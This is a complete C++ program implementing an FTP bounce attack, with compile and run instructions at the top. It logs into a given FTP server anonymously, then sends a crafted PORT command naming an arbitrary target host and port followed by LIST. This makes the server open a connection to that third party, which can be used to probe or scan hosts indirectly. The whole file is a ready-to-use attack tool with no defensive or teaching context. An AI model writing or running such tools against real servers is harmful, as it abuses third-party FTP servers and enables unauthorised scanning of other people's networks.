// Compile: g++ -o ftp_bounce ftp_bounce.cpp
// Run: ./ftp_bounce <ftp_server> <target_host> <target_port>
// No special privileges required

#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <string>

class FTPBounce {
private:
    int sock;
    std::string ftpServer;
    int ftpPort;
    
public:
    FTPBounce(const std::string& server, int port = 21) 
        : ftpServer(server), ftpPort(port) {}
    
    bool connect() {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) return false;
        
        struct hostent* host = gethostbyname(ftpServer.c_str());
        if (!host) return false;
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(ftpPort);
        memcpy(&addr.sin_addr.s_addr, host->h_addr, host->h_length);
        
        return ::connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0;
    }
    
    std::string sendCmd(const std::string& cmd) {
        std::string command = cmd + "\r\n";
        send(sock, command.c_str(), command.length(), 0);
        
        char buffer[4096];
        int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes > 0) {
            buffer[bytes] = '\0';
            return std::string(buffer);
        }
        return "";
    }
    
    void bounce(const std::string& targetHost, int targetPort) {
        // Login anonymously
        sendCmd("USER anonymous");
        sendCmd("PASS test@test.com");
        
        // Construct PORT command with target
        struct in_addr addr;
        inet_aton(targetHost.c_str(), &addr);
        unsigned char* ip = (unsigned char*)&addr.s_addr;
        
        char portCmd[256];
        snprintf(portCmd, sizeof(portCmd), "PORT %d,%d,%d,%d,%d,%d",
                 ip[0], ip[1], ip[2], ip[3],
                 targetPort >> 8, targetPort & 0xFF);
        
        std::string response = sendCmd(portCmd);
        std::cout << "PORT response: " << response << std::endl;
        
        // Send command to bounce
        response = sendCmd("LIST");
        std::cout << "LIST response: " << response << std::endl;
    }
    
    ~FTPBounce() { if (sock >= 0) close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <ftp_server> <target_host> <target_port>\n";
        return 1;
    }
    FTPBounce bounce(argv[1]);
    if (bounce.connect()) {
        bounce.bounce(argv[2], atoi(argv[3]));
    }
    return 0;
}